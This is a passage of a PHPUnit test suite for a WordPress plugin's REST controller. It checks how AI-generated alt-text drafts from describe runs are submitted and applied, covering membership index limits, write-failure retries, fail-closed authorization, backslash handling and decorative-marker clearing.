                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $index = get_option('acx_describe_run_media_ids_index', []);
        $this->assertCount(200, $index);
        $this->assertArrayNotHasKey($oldestRun, $index);
        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
        $this->assertArrayHasKey($newRun, $index);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $newRun, false));
    }

    /**
     * BR-142: when the index is past the 200 cap entirely with *recent* runs
     * (younger than the 7d retention floor), cap eviction must not revoke the
     * oldest membership — let the index exceed the cap. Goes RED if prune still
     * delete_option()s any oldest entry regardless of age.
     */
    public function testMembershipIndexCapDoesNotEvictRecentRuns(): void
    {
        $now = time();
        for ($i = 0; $i < 200; $i++) {
            $runId = sprintf('eeeeeeee-eeee-eeee-eeee-%012d', $i);
            // All within ~33 minutes — well under the 7-day floor.
            $this->plantSubmittedMediaIds($runId, [70 + ($i % 5)], $now - 2000 + $i);
        }
        $oldestRun = sprintf('eeeeeeee-eeee-eeee-eeee-%012d', 0);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));

        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $newRun = 'ffffffff-ffff-ffff-ffff-ffffffffffff';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $newRun,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $index = get_option('acx_describe_run_media_ids_index', []);
        // Cap may not be satisfied — index exceeds 200 rather than revoke live runs.
        $this->assertGreaterThan(200, count($index));
        $this->assertArrayHasKey($oldestRun, $index);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
        $this->assertArrayHasKey($newRun, $index);

        // Oldest recent membership still authorizes apply.
        $this->plantPostType(70);
        $this->queueRunStatusResponse($oldestRun, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $oldestRun,
                'items' => [
                    [
                        'media_id' => 70,
                        'status' => 'completed',
                        'alt_text_draft' => 'still live after cap overflow',
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);
        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $oldestRun . '/apply');
        $apply->set_param('run_id', $oldestRun);
        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
        $this->assertNotInstanceOf(\WP_Error::class, $applyResponse);
        $this->assertSame([70], $applyResponse->get_data()['applied']);
    }

    /**
     * BR-148: index write failure must not silently orphan membership forever
     * without visibility — retry once, keep membership, log the condition.
     * Goes RED if remember_run_media_ids_index ignores update_option's return.
     */
    public function testIndexWriteFailureRetriesAndKeepsMembership(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111148';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $indexKey = 'acx_describe_run_media_ids_index';
        $membershipKey = 'acx_describe_run_media_ids_' . $runId;
        $GLOBALS['__ac_update_option_fail'][$indexKey] = true;
        $GLOBALS['__ac_update_option_calls'] = [];

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        // Membership write succeeded; submit still 202 — authorization retained.
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertIsArray(get_option($membershipKey, false));
        // Index never persisted (forced failure).
        $this->assertFalse(get_option($indexKey, false));
        // Retry once → two update_option attempts on the index key.
        $this->assertSame(2, $GLOBALS['__ac_update_option_calls'][$indexKey] ?? 0);
        // Condition is not swallowed.
        $log = $this->getErrorLog();
        $this->assertNotEmpty($log);
        $this->assertTrue(
            (bool) array_filter(
                $log,
                static fn (string $line): bool => str_contains($line, 'media_ids index write failed')
                    && str_contains($line, $runId)
            ),
            'Expected telemetry log naming the failed index write and run_id'
        );
    }

    /**
     * BR-146: membership is stored only on a successful submit (status < 400).
     * An upstream 500 that echoes a run_id must not plant an authorization record.
     * Goes RED if the guard stores whenever the body is a WP_REST_Response.
     */
    public function testFailedSubmitDoesNotStoreMembershipEvenWithRunId(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111146';
        $this->queueHttpResponse([
            'response' => ['code' => 500, 'message' => 'Internal Server Error'],
            'body' => json_encode([
                'run_id' => $runId,
                'detail' => 'upstream exploded after assigning a run_id',
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_REST_Response::class, $response);
        $this->assertSame(500, $response->get_status());
        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $runId, false));
        $index = get_option('acx_describe_run_media_ids_index', []);
        if (is_array($index)) {
            $this->assertArrayNotHasKey($runId, $index);
        }

        // Subsequent apply of that run id is refused (fail closed).
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 101,
                        'status' => 'completed',
                        'alt_text_draft' => 'should not apply',
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);
        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $apply->set_param('run_id', $runId);
        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
        $this->assertInstanceOf(\WP_Error::class, $applyResponse);
        $this->assertSame('describe_run_media_ids_unknown', $applyResponse->get_error_code());
    }

    /**
     * BR-145: non-array items must yield the 502 contract violation on GET /items
     * and on apply — not a PHP TypeError fatal during enrichment.
     */
    public function testNonArrayItemReturnsContractViolationOnItemsAndApply(): void
    {
        $runId = '11111111-1111-1111-1111-111111111145';
        $nonArrayBody = json_encode([
            'tenant_id' => self::currentTenantId(),
            'run_id' => $runId,
            'items' => ['not-an-object'],
        ]);

        // GET /items
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => $nonArrayBody,
        ]);
        $itemsReq = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $itemsReq->set_param('run_id', $runId);
        $itemsResponse = $this->controller->get_describe_run_items($itemsReq);
        $this->assertInstanceOf(\WP_Error::class, $itemsResponse);
        $this->assertSame('describe_run_items_contract_violation', $itemsResponse->get_error_code());
        $this->assertSame(502, $itemsResponse->get_error_data()['status'] ?? null);

        // POST /apply — enrichment runs via get_describe_run_items before the loop.
        $this->plantSubmittedMediaIds($runId, [70]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => $nonArrayBody,
        ]);
        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $apply->set_param('run_id', $runId);
        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
        $this->assertInstanceOf(\WP_Error::class, $applyResponse);
        $this->assertSame('describe_run_items_contract_violation', $applyResponse->get_error_code());
        $this->assertSame(502, $applyResponse->get_error_data()['status'] ?? null);
    }

    /**
     * BR-147: when a matching membership record already exists, update_option's
     * false (forced failure *or* unchanged value) is recovered — submit succeeds.
     * Goes RED if the recovery branch is missing or the stub never returns false
     * for identical writes.
     */
    public function testSubmitSucceedsWhenMatchingMembershipAlreadyPresent(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111147';
        $optionKey = 'acx_describe_run_media_ids_' . $runId;

        // Plant a matching record, then force the write to fail so recovery fires.
        update_option(
            $optionKey,
            [
                'media_ids' => [101],
                'created_at' => time() - 60,
            ],
            false
        );
        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(202, $response->get_status());
        $this->assertIsArray(get_option($optionKey, false));
    }

    /**
     * BR-147: membership option must be written with autoload=false.
     * Goes RED if store_run_media_ids drops the third arg or passes true.
     */
    public function testMembershipOptionWrittenWithoutAutoload(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111157';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $optionKey = 'acx_describe_run_media_ids_' . $runId;
        $this->assertArrayHasKey($optionKey, $GLOBALS['__ac_option_autoload'] ?? []);
        $this->assertFalse($GLOBALS['__ac_option_autoload'][$optionKey]);
        $this->assertArrayHasKey('acx_describe_run_media_ids_index', $GLOBALS['__ac_option_autoload'] ?? []);
        $this->assertFalse($GLOBALS['__ac_option_autoload']['acx_describe_run_media_ids_index']);
    }

    /**
     * BR-147: media_ids equality uses array_values() so a list stored under
     * non-contiguous keys still matches. Goes RED if the compare drops
     * array_values() and rejects a value-equal but key-shifted record.
     */
    public function testMembershipRecoveryComparesMediaIdsByValueNotKeys(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $this->plantAttachment(202, "\xff\xd8\xff\xe0jpeg-202", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111167';
        $optionKey = 'acx_describe_run_media_ids_' . $runId;

        // Plant with non-contiguous keys (not 0..n) — equal after array_values().
        update_option(
            $optionKey,
            [
                'media_ids' => [2 => 101, 5 => 202],
                'created_at' => time() - 30,
            ],
            false
        );
        // Force false so the recovery / equality branch must fire.
        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 2,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(202, $response->get_status());
    }

    /**
     * R23-BR-10 / R22-BR-01 [TEST-15]: bulk partial plant with a backslash-bearing
     * draft must hash the **stored** alt form (post wp_unslash), not the raw draft.
     * Combines both conditions the prior suite lacked on bulk: backslash draft AND
     * forced provenance-write failure so the marker is planted through the production
     * partial path. Second apply recovers (applied, provenance non-empty, marker cleared).
     *
     * [R23-BR-30][TEST-15] honesty note: the production defect (raw-domain plant)
     * is caught by the bucket side effect, not by the hash lines below. A wrong-
     * domain plant makes `is_usable_pending_marker_for_draft` fail at plant time,
     * so the item buckets `failed` rather than `partial` — the first RED is
     * `assertSame([$mediaId], $firstData['partial'])` together with
     * `assertSame([], $firstData['failed'])`. Reaching the hash comparison
     * already requires `marker_ok` (stored-domain equality), so the hash
     * assertions are a redundant restatement of that predicate for domain
     * documentation — not an independent pin. They are retained so the stored-
     * vs-raw domain divergence remains visible in the test body [TEST-15].
     *
     * RED under: mutate bulk plant draft_hash to hash( 'sha256', $draft ) (raw
     * domain) → fails at partial/failed bucket assertions above the hash lines.
     */
    public function testApplyRunDraftsBulkPartialBackslashPlantsStoredDomainHashAndRecovers(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $mediaId = 71;
        // Same backslash draft as the R22-BR-01 single/CLI pins and the reviewer probe.
        $rawDraft = 'AC\\DC concert poster';
        $expectedStored = wp_unslash($rawDraft);
        $this->assertNotSame($rawDraft, $expectedStored, 'fixture must diverge raw vs stored domain');

        $this->plantPostType($mediaId);
        $this->plantSubmittedMediaIds($runId, [$mediaId]);
        // Force provenance write to fail → production partial path plants the marker.
        $GLOBALS['__ac_update_post_meta_fail'][$mediaId]['_acx_description_provenance'] = true;

        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => $mediaId,
                        'status' => 'completed',
                        'alt_text_draft' => $rawDraft,
                        'caption' => 'poster',
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $first->set_param('run_id', $runId);
        $firstResponse = $this->controller->apply_describe_run_drafts($first);
        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
        $firstData = $firstResponse->get_data();
        // Bucket pin is the actual RED for wrong-domain plant [R23-BR-30]:
        // raw-domain draft_hash → marker_ok fails → failed, not partial.
        $this->assertSame([$mediaId], $firstData['partial']);
        $this->assertSame([], $firstData['applied']);
        $this->assertSame([], $firstData['failed']);

        $storedAlt = get_post_meta($mediaId, '_wp_attachment_image_alt', true);
        $this->assertSame($expectedStored, $storedAlt);
        $this->assertSame('', get_post_meta($mediaId, '_acx_description_provenance', true));

        $pending = get_post_meta($mediaId, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id'] ?? null);
        // Domain documentation (redundant once partial+failed above passed —
        // marker_ok already required stored-domain equality) [R23-BR-30]:
        $storedDomainHash = \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt(
            is_string($storedAlt) ? $storedAlt : (string) $storedAlt
        );
        $rawDomainHash = hash('sha256', $rawDraft);
        $this->assertNotSame($rawDomainHash, $storedDomainHash, 'domains must differ for this fixture');
        $this->assertSame($storedDomainHash, $pending['draft_hash'] ?? null);
        $this->assertNotSame($rawDomainHash, $pending['draft_hash'] ?? null);

        // Second apply: clear forced failure; recovery must complete without overwrite.
        unset($GLOBALS['__ac_update_post_meta_fail'][$mediaId]['_acx_description_provenance']);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => $mediaId,
                        'status' => 'completed',
                        'alt_text_draft' => $rawDraft,
                        'caption' => 'poster',
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $second->set_param('run_id', $runId);
        $secondResponse = $this->controller->apply_describe_run_drafts($second);
        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
        $secondData = $secondResponse->get_data();
        $this->assertSame([$mediaId], $secondData['applied']);
        $this->assertSame([], $secondData['partial']);
        $this->assertSame([], $secondData['skipped_existing']);
        $prov = get_post_meta($mediaId, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertNotSame('', $prov);
        $this->assertSame('', get_post_meta($mediaId, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-17: bulk apply with a backslash-bearing draft stores alt and provenance
     * that agree after WP's unslash, and re-apply must not report `failed`.
     */
    public function testApplyRunDraftsBackslashDraftAgreesAndReapplySucceeds(): void
    {
        $runId = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee';
        $mediaId = 91;
        $draft = 'Blueprint of the C:\\Users share, annotated';
        $expectedStored = wp_unslash($draft);

        $this->plantPostType($mediaId);
        $this->plantSubmittedMediaIds($runId, [$mediaId]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => $mediaId,
                        'status' => 'completed',
                        'alt_text_draft' => $draft,
                        'caption' => 'blueprint',
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $first->set_param('run_id', $runId);
        $firstResponse = $this->controller->apply_describe_run_drafts($first);
        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
        $firstData = $firstResponse->get_data();
        $this->assertSame([$mediaId], $firstData['applied']);
        $this->assertSame([], $firstData['failed']);
        $this->assertSame([], $firstData['partial']);

        $storedAlt = get_post_meta($mediaId, '_wp_attachment_image_alt', true);
        $prov = get_post_meta($mediaId, '_acx_description_provenance', true);
        $this->assertSame($expectedStored, $storedAlt);
        $this->assertIsArray($prov);
        // Provenance draft must agree with stored alt (both unslashed by WP).
        $this->assertSame($storedAlt, $prov['alt_text_draft']);

        // Re-apply with overwrite: byte-identical no-op must still be applied, not failed.
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => $mediaId,
                        'status' => 'completed',
                        'alt_text_draft' => $draft,
                        'caption' => 'blueprint',
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $second->set_param('run_id', $runId);
        $second->set_param('overwrite_media_ids', [$mediaId]);
        $secondResponse = $this->controller->apply_describe_run_drafts($second);
        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
        $secondData = $secondResponse->get_data();
        $this->assertSame([$mediaId], $secondData['applied']);
        $this->assertSame([], $secondData['failed']);
        $this->assertSame($expectedStored, get_post_meta($mediaId, '_wp_attachment_image_alt', true));
    }

    /**
     * WBUX-5-R16-BR-10 / BR-17: re-applying a byte-identical alt (update_post_meta
     * no-op returns false) reports applied because read-back confirmed the stored
     * value — not because a false write return was ignored. Skipping the
     * false-branch leaves alt_ok false → failed.
     */
    public function testApplyRunDraftsNaturalNoOpReportsApplied(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        // Plant the exact draft that apply will write so the alt write is a natural no-op.
        $draft = 'a dog in a park';
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $request->set_param('overwrite_media_ids', [71]);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertContains(71, $data['applied']);
        $this->assertNotContains(71, $data['failed']);
        // Post-write stored value — pins that read-back accepted the no-op.
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertIsArray(get_post_meta(71, '_acx_description_provenance', true));
    }

    /**
     * A-05: bulk apply must self-heal acx_alt_decorative when it writes a
     * non-empty alt. Sequence that produces the stale pair without the clear:
     *   1. Attachment is missing_alt (stored alt '').
     *   2. Run state is planted (apply path will consume drafts).
     *   3. Operator marks decorative — acx_alt_decorative='1', alt still ''.
     *   4. Apply: CAS compares alt only ('' === ''), writes non-empty draft.
     * Without the clear, applied still contains the id but the marker survives
     * beside a non-empty alt. Sibling of record_correction's self-heal.
     * [TEST-15]
     */
    public function testApplyRunDraftsClearsDecorativeMarkerWhenWritingNonEmptyAlt(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // 71: empty alt at decision time (missing_alt).
        $this->setPostMeta(71, '_wp_attachment_image_alt', '');

        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        // After the decision-time empty-alt snapshot would hold: plant the
        // decorative marker while alt remains ''. CAS only sees alt.
        $this->setPostMeta(71, 'acx_alt_decorative', '1');
        $this->assertSame('1', get_post_meta(71, 'acx_alt_decorative', true));
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        // Alt write + provenance succeed → applied; marker must not survive.
        $this->assertContains(71, $data['applied']);
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, 'acx_alt_decorative', true));
        $this->assertArrayNotHasKey(
            'acx_alt_decorative',
            $GLOBALS['__ac_post_meta'][71] ?? []
        );
    }

    /**
     * [TEST-15] Controller tri-state: omitted `decorative` must map to null, not
     * false. Empty alt + prior marker + no decorative param must leave the
     * marker intact (null ≡ clear-only-on-non-empty-alt). The collapsing form
     * `(bool) ( $request->get_param('decorative') ?? false )` would un-mark and
     * drop the image into missing_alt — existing tests cannot discriminate
     * because they either send explicit false or use non-empty alt with no
     * prior marker. [A-02]
     */
    public function testCorrectHistoryOmitsDecorativePreservesPriorMarkerOnEmptyAlt(): void
    {
        $mediaId = 630;
        $GLOBALS['__ac_posts'][$mediaId] = (object) [
            'ID' => $mediaId,
            'post_type' => 'attachment',
            'post_title' => 'Omitted decorative pin',
        ];
        $GLOBALS['__ac_attachment_mimes'][$mediaId] = 'image/jpeg';
        $this->setPostMeta($mediaId, '_wp_attachment_image_alt', '');
        $this->setPostMeta($mediaId, 'acx_alt_decorative', '1');

        $request = new WP_REST_Request(
            'POST',
            '/acx/v1/recognition/describe/history/' . $mediaId . '/correction'
        );
        $request->set_param('media_id', $mediaId);
        $request->set_param('alt_text', '');
        // decorative intentionally not set — must be null at the service, not false.

        $response = $this->controller->correct_description_history_item($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertInstanceOf(\WP_REST_Response::class, $response);
        $this->assertTrue($response->get_data()['is_decorative']);
        $this->assertSame('1', get_post_meta($mediaId, 'acx_alt_decorative', true));
        $this->assertSame('', get_post_meta($mediaId, '_wp_attachment_image_alt', true));
    }

    /**
     * [INT-09]: when delete of acx_alt_decorative fails after a verified non-empty
     * alt write, the id must land in `partial` — not `applied`. Sibling of
     * DescriptionHistoryService::record_correction's description_correction_partial
     * for the same fault; bulk surface has an explicit partial bucket for
     * "alt landed, secondary durable write did not". Telemetry log retained.
     * [TEST-15] [DATA-14]
     */
    public function testApplyRunDraftsBucketsPartialWhenDecorativeClearFails(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->setPostMeta(71, '_wp_attachment_image_alt', '');

        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $this->setPostMeta(71, 'acx_alt_decorative', '1');
        // Force delete of the decorative marker to no-op; read-back still sees '1'.
        $GLOBALS['__ac_delete_post_meta_fail'][71]['acx_alt_decorative'] = true;

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        // Alt landed; decorative marker did not clear → partial, not applied.
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame([], $data['failed']);
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('1', get_post_meta(71, 'acx_alt_decorative', true));
        // Provenance still stamps (alt path succeeded; secondary clear is the gap).
        $this->assertIsArray(get_post_meta(71, '_acx_description_provenance', true));

        $log = $this->getErrorLog();
        $this->assertNotEmpty($log);
        $this->assertTrue(
            (bool) array_filter(
                $log,
                static fn (string $line): bool => str_contains($line, 'acx_alt_decorative clear failed')
                    && str_contains($line, 'media_id=71')
                    && str_contains($line, $runId)
            ),
            'Expected telemetry log naming the failed decorative clear, media_id, and run_id'
        );
    }
}
